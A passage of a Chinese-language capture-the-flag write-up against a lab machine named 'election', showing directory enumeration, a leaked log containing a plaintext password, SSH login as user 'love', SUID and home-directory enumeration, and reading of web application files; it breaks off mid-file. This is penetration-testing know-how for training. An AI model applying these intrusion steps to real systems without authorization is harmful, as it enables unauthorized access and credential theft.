<br>[04:29:41] 200 -  964B  - /election/themes/                                 <br>[04:29:41] 301 -  326B  - /election/themes  -&gt;  http://192.168.56.128/election/themes/<br></code></pre></td></tr></table></figure><p>发现了很多目录，尝试访问 <code>admin/index.php</code></p><p><img src="/pic/f0e9ac4a8c53dddd66143177f4aadb1f_MD5.png"></p><p>似乎需要输入 admin 的 id，随便输入了一下，发现提示</p><p><img src="/pic/85297e44f267940b86a6d2e225bb1ba1_MD5.png"></p><p>看来不一定能使用爆破了（后续 burp 抓包发现这是 js 文件根据请求包字段做的限制，其实可以绕过）。再看看别的目录，data 目录</p><p><img src="/pic/f95de58820af410b89a425e4e8c9abd0_MD5.png"></p><p>logs 目录</p><p><img src="/pic/e15a4c0740bf8b666a615aac887d4f30_MD5.png"></p><h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p>有个日志文件下载下来看看</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-01</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] Assigned <span class="hljs-keyword">Password</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">user</span> love: P@$$<span class="language-pgsql">w0rd@<span class="hljs-number">123</span></span><br><span class="language-pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-03</span> <span class="hljs-number">00</span>:<span class="hljs-number">13</span>:<span class="hljs-number">53</span>] Love added candidate <span class="hljs-string">&#x27;Love&#x27;</span>.</span><br><span class="language-pgsql">[<span class="hljs-number">2020</span><span class="hljs-number">-04</span><span class="hljs-number">-08</span> <span class="hljs-number">19</span>:<span class="hljs-number">26</span>:<span class="hljs-number">34</span>] Love has been <span class="hljs-keyword">logged</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">from</span> <span class="hljs-type">Unknown</span> IP <span class="hljs-keyword">on</span> Firefox (Linux).</span><br></code></pre></td></tr></table></figure><h2 id="ssh-登录"><a href="#ssh-登录" class="headerlink" title="ssh 登录"></a>ssh 登录</h2><p>竟然在这里拿到了用户名和密码，尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ssh love@192.168.56.128            <br>love@192.168.56.128\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Canonical Livepatch is available for installation.</span><br><span class="hljs-string">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="hljs-string">     https://ubuntu.com/livepatch</span><br><span class="hljs-string"></span><br><span class="hljs-string">74 packages can be updated.</span><br><span class="hljs-string">28 updates are security updates.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="hljs-string">Last login: Fri Jul 14 19:22:22 2023 from 192.168.56.106</span><br><span class="hljs-string">love@election:~$ id</span><br><span class="hljs-string">uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="hljs-string">love@election:~$ whoami</span><br><span class="hljs-string">love</span><br><span class="hljs-string">love@election:~$ uname -a</span><br><span class="hljs-string">Linux election 5.3.0-46-generic #38~18.04.1-Ubuntu SMP Tue Mar 31 04:17:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">love@election:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:fe:c8:1d brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.128/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3</span><br><span class="hljs-string">       valid_lft 539sec preferred_lft 539sec</span><br><span class="hljs-string">    inet6 fe80::321e:9192:79f9:852/64 scope link noprefixroute </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">love@election:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for love: </span><br><span class="hljs-string">Sorry, user love may not run sudo on election.</span><br></code></pre></td></tr></table></figure><p>基础的信息收集顺便也完成了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看看用户家目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:~$ <span class="hljs-built_in">ls</span> -liah<br>total 100K<br>295199 drwsrwxrwx 18 love love 4.0K May 27  2020 .<br>262146 drwxr-xr-x  3 root root 4.0K Apr  9  2020 ..<br>262955 -rw-------  1 love love 1.3K Jul 15 13:47 .bash_history<br>400690 drwxrwxrwx 15 love love 4.0K Apr  8  2020 .cache<br>400783 drwxrwxrwx 14 love love 4.0K May 26  2020 .config<br>408810 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .dbus<br>400951 drwxrwxrwx  2 love love 4.0K Apr  9  2020 Desktop<br>400955 drwxrwxrwx  2 love love 4.0K Apr  8  2020 Documents<br>400952 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Downloads<br>400570 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .gnupg<br>295196 drwxrwxrwx  2 love love 4.0K Oct 20  2019 .gvfs<br>282869 -rwxrwxrwx  1 love love 9.7K May 27  2020 .ICEauthority<br>400693 drwxrwxrwx  3 love love 4.0K Oct 20  2019 .<span class="hljs-built_in">local</span><br>262892 drwxrwxrwx  5 love love 4.0K Apr  2  2020 .mozilla<br>400956 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Music<br>400957 drwxrwxrwx  2 love love 4.0K Oct 21  2019 Pictures<br>270979 -rwxrwxrwx  1 love love  807 Oct 20  2019 .profile<br>400954 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Public<br>282936 -rwxrwxrwx  1 love love   66 Oct 20  2019 .selected_editor<br>283509 -rw-rw-r--  1 love love   83 May 26  2020 .Serv-U-Tray.conf<br>406263 drwxrwxrwx  2 love love 4.0K Oct 20  2019 .ssh<br>282870 -rwxrwxrwx  1 love love    0 Oct 20  2019 .sudo_as_admin_successful<br>400953 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Templates<br>400958 drwxrwxrwx  2 love love 4.0K Oct 20  2019 Videos<br><br></code></pre></td></tr></table></figure><p>对各个文件夹进行信息收集，在 Desktop 目录中发现了 <code>user.txt</code>，尝试在 <code>.mozilla</code> 看看有没有可能存储了保存的密码，很可惜并没有，借助于 gpt 可以迅速感知各个文件夹的作用，方便信息筛选。看看定时任务和 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election/admin/ajax$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>      199     24 -rwsr-xr-x   1 root     root        22528 Jun 28  2019 /usr/bin/arping<br>      950     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd<br>     1056     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2019 /usr/bin/pkexec<br>     1443     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>      892     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp<br>      275     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh<br>      273     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn<br>      530     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd<br>     5281    148 -rwsr-xr-x   1 root     root       149080 Jan 31  2020 /usr/bin/sudo<br>     3127    376 -rwsr-xr--   1 root     dip        382696 Feb 11  2020 /usr/sbin/pppd<br>   396554   6172 -rwsr-xr-x   1 root     root      6319088 Nov 29  2017 /usr/local/Serv-U/Serv-U<br>     6947     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>     2605     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>     6907    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>     2304     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>      277     12 -rwsr-sr-x   1 root     root          10232 Dec 18  2019 /usr/lib/xorg/Xorg.wrap<br>   262203     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount<br>   262276     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping<br>   262201     28 -rwsr-xr-x   1 root     root          26696 Mar  5  2020 /bin/umount<br>   262188     44 -rwsr-xr-x   1 root     root          43088 Mar  5  2020 /bin/mount<br>   262304     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su<br>       66     40 -rwsr-xr-x   1 root     root          40152 Aug 23  2019 /snap/core/7917/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root          44168 May  8  2014 /snap/core/7917/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root          44680 May  8  2014 /snap/core/7917/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/7917/bin/su<br>      116     27 -rwsr-xr-x   1 root     root          27608 Aug 23  2019 /snap/core/7917/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/7917/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/7917/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/7917/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/7917/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/7917/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root         136808 Jun 11  2019 /snap/core/7917/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/7917/usr/lib/openssh/ssh-keysign<br>     6454    105 -rwsr-sr-x   1 root     root              106696 Oct  1  2019 /snap/core/7917/usr/lib/snapd/snap-confine<br>     7628    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/7917/usr/sbin/pppd<br>       66     40 -rwsr-xr-x   1 root     root               40152 May 16  2019 /snap/core/7270/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root               44168 May  8  2014 /snap/core/7270/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root               44680 May  8  2014 /snap/core/7270/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/7270/bin/su<br>      116     27 -rwsr-xr-x   1 root     root               27608 May 16  2019 /snap/core/7270/bin/umount<br>     2657     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/7270/usr/bin/chfn<br>     2659     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/7270/usr/bin/chsh<br>     2735     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/7270/usr/bin/gpasswd<br>     2827     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/7270/usr/bin/newgrp<br>     2840     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/7270/usr/bin/passwd<br>     2950    134 -rwsr-xr-x   1 root     root              136808 Jun 11  2019 /snap/core/7270/usr/bin/sudo<br>     3049     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3419    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign<br>     6452    101 -rwsr-sr-x   1 root     root              102600 Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine<br>     7622    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/7270/usr/sbin/pppd<br>       55     43 -rwsr-xr-x   1 root     root               43088 Oct 16  2018 /snap/core18/1066/bin/mount<br>       64     63 -rwsr-xr-x   1 root     root               64424 Mar 10  2017 /snap/core18/1066/bin/ping<br>       80     44 -rwsr-xr-x   1 root     root               44664 Mar 23  2019 /snap/core18/1066/bin/su<br>       98     27 -rwsr-xr-x   1 root     root               26696 Oct 16  2018 /snap/core18/1066/bin/umount<br>     1720     75 -rwsr-xr-x   1 root     root               76496 Mar 23  2019 /snap/core18/1066/usr/bin/chfn<br>     1722     44 -rwsr-xr-x   1 root     root               44528 Mar 23  2019 /snap/core18/1066/usr/bin/chsh<br>     1772     75 -rwsr-xr-x   1 root     root               75824 Mar 23  2019 /snap/core18/1066/usr/bin/gpasswd<br>     1836     40 -rwsr-xr-x   1 root     root               40344 Mar 23  2019 /snap/core18/1066/usr/bin/newgrp<br>     1848     59 -rwsr-xr-x   1 root     root               59640 Mar 23  2019 /snap/core18/1066/usr/bin/passwd<br>     1939    146 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /snap/core18/1066/usr/bin/sudo<br>     2026     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     2334    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1066/usr/lib/openssh/ssh-keysign<br>       55     43 -rwsr-xr-x   1 root     root               43088 Aug 23  2019 /snap/core18/1223/bin/mount<br>       64     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1223/bin/ping<br>       80     44 -rwsr-xr-x   1 root     root               44664 Mar 23  2019 /snap/core18/1223/bin/su<br>       98     27 -rwsr-xr-x   1 root     root               26696 Aug 23  2019 /snap/core18/1223/bin/umount<br>     1730     75 -rwsr-xr-x   1 root     root               76496 Mar 23  2019 /snap/core18/1223/usr/bin/chfn<br>     1732     44 -rwsr-xr-x   1 root     root               44528 Mar 23  2019 /snap/core18/1223/usr/bin/chsh<br>     1782     75 -rwsr-xr-x   1 root     root               75824 Mar 23  2019 /snap/core18/1223/usr/bin/gpasswd<br>     1846     40 -rwsr-xr-x   1 root     root               40344 Mar 23  2019 /snap/core18/1223/usr/bin/newgrp<br>     1858     59 -rwsr-xr-x   1 root     root               59640 Mar 23  2019 /snap/core18/1223/usr/bin/passwd<br>     1949    146 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /snap/core18/1223/usr/bin/sudo<br>     2036     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     2344    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1223/usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure><p>好像并没有很值得注意的地方，<code>/usr/local/Serv-U/Serv-U</code> 文件似乎有点特殊。不过 gtfobins 中没有它的利用，先看看别的吧，去找找网站目录配置文件的数据库密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html$ <span class="hljs-built_in">ls</span> -liah<br>total 32K<br>406326 drwxrwxrwx 3 www-data www-data 4.0K May 27  2020 .<br>406325 drwxrwxr-x 4 www-data www-data 4.0K Oct 21  2019 ..<br>394552 drwxrwxrwx 9 www-data www-data 4.0K Apr  9  2020 election<br>405623 -rwxrwxrwx 1 www-data www-data  11K Oct 20  2019 index.html<br>408195 -rwxrwxrwx 1 www-data www-data   21 Oct 20  2019 phpinfo.php<br>400981 -rwxrwxrwx 1 root     root       30 Apr  2  2020 robots.txt<br>love@election:/var/www/html$ <span class="hljs-built_in">cd</span> election<br>love@election:/var/www/html/election$ <span class="hljs-built_in">ls</span> -liah<br>total 100K<br>394552 drwxrwxrwx  9 www-data www-data 4.0K Apr  9  2020 .<br>406326 drwxrwxrwx  3 www-data www-data 4.0K May 27  2020 ..<br>405922 drwxr-xr-x 10 www-data www-data 4.0K Apr  3  2020 admin<br>395544 -rw-r--r--  1 love     love     1.9K Apr  9  2020 card.php<br>407959 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 data<br>407960 -rw-r--r--  1 www-data www-data 4.7K Apr  3  2020 favicon.png<br>394559 -rwxrwxrwx  1 www-data www-data   83 Apr  3  2020 .htaccess<br>407961 -rw-r--r--  1 www-data www-data  455 Apr  3  2020 index.php<br>407962 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 js<br>407964 drwxr-xr-x  4 www-data www-data 4.0K Apr  3  2020 languages<br>408189 drwxr-xr-x  2 www-data www-data 4.0K Apr  3  2020 lib<br>394553 -rwxrwxrwx  1 www-data www-data  35K Feb 28  2019 license.tp<br>408191 drwxr-xr-x  6 www-data www-data 4.0K Apr  3  2020 media<br>408201 -rw-r--r--  1 www-data www-data 1.1K Apr  3  2020 pemilihan.php<br>408465 drwxr-xr-x  3 www-data www-data 4.0K Apr  3  2020 themes<br>412336 -rw-r--r--  1 www-data www-data   97 Apr  3  2020 version.tp<br></code></pre></td></tr></table></figure><p>依次查看文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> version.tp<br>&#123;<br>        <span class="hljs-string">&quot;codename&quot;</span>: <span class="hljs-string">&quot;Arctic Fox&quot;</span>,<br>        <span class="hljs-string">&quot;major&quot;</span>: 2,<br>        <span class="hljs-string">&quot;minor&quot;</span>: 0,<br>        <span class="hljs-string">&quot;released_date&quot;</span>: <span class="hljs-string">&quot;2019-03-06 00:00:00&quot;</span><br>&#125;<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> card.php<br>00110000 00110001 00110001 00110001 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110000 00110000 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110001 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110000 00110001 00110001 00110000 00110001 00110000 00100000 00110000 00110001 00110001 00110001 00110001 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110001 00110001 00110000 00110000 00110001 00110001 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110000 00110001 00100000 00110000 00110001 00110000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110000 00110001 00110000 00110000 00110000 00110001 00110001<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> .htaccess<br>Options -Indexes<br>RewriteEngine on<br>RewriteRule ^admin/logs/system.log admin/logs.php<br>love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> index.php<br>&lt;?php<br>  <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-string">&quot;./admin/inc/conn.php&quot;</span>))&#123;<br>    header(<span class="hljs-string">&quot;Location: ./install/?_rdr&quot;</span>);<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  require <span class="hljs-string">&quot;./lib/homeAPI.php&quot;</span>;<br><br>  <span class="hljs-variable">$home</span> = new homeAPI();<br>  <span class="hljs-variable">$localize</span> = <span class="hljs-variable">$home</span> -&gt; localize();<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$home</span> -&gt; isRegistered())&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_redirecting]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./pemilihan.php?_loggedin&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <br>  include <span class="hljs-variable">$home</span> -&gt; getThemeFile(<span class="hljs-string">&quot;home.php&quot;</span>);<br><br>  <span class="hljs-variable">$home</span> -&gt; db_disconnect();<br>?&gt;<br><br></code></pre></td></tr></table></figure><p>index.php 文件中提到了一个文件 <code>./admin/inc/conn.php</code>，根据名字猜测应该是数据库连接配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">love@election:/var/www/html/election$ <span class="hljs-built_in">cat</span> pemilihan.php<br>&lt;?php<br>  <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-string">&quot;./admin/inc/conn.php&quot;</span>))&#123;<br>    header(<span class="hljs-string">&quot;Location: ./install/?_rdr&quot;</span>);<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  require <span class="hljs-string">&quot;./lib/homeAPI.php&quot;</span>;<br><br>  <span class="hljs-variable">$election</span> = new homeAPI();<br>  <span class="hljs-variable">$localize</span> = <span class="hljs-variable">$election</span> -&gt; localize();<br><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$election</span> -&gt; isRegistered() == <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$localize</span>[alert_acces_denied]&lt;script&gt;setTimeout(function()&#123;top.location=&#x27;./?_nosession&#x27;;&#125;,1000)&lt;/script&gt;&quot;</span>;<br>    <span class="hljs-built_in">exit</span>();<br>  &#125;<br>  <br>  <span class="hljs-variable">$timeNow</span> = strtotime(<span class="hljs-variable">$election</span> -&gt; getCurrentTimestamp());<br>  <span class="hljs-variable">$timeExp</span> = strtotime(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_kadaluarsa&#x27;</span>]);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$timeNow</span> &gt; <span class="hljs-variable">$timeExp</span>)&#123;<br>    <span class="hljs-built_in">unset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih&#x27;</span>],<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_kadaluarsa&#x27;</span>],<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;os_pemilih_panitia&#x27;</span>]);<br>    <span 